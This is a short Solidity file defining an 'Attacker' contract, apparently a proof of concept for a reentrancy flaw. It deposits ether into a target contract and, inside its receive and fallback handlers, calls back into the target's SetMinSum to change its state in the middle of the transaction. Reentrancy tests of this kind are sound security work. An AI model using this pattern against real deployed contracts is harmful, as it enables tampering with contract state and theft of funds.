contract Attacker {
    C public target;
    uint256 public reentrantVal;
    bool public reentered;

    constructor(C _target, uint256 _val) {
        target = _target;
        reentrantVal = _val;
        reentered = false;
    }

    function initiatePut() external payable {
        target.Put{value: msg.value}(0);
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            // Reentrant call to SetMinSum with a different value
            target.SetMinSum(reentrantVal);
        }
    }

    fallback() external payable {
        if (!reentered) {
            reentered = true;
            target.SetMinSum(reentrantVal);
        }
    }
}

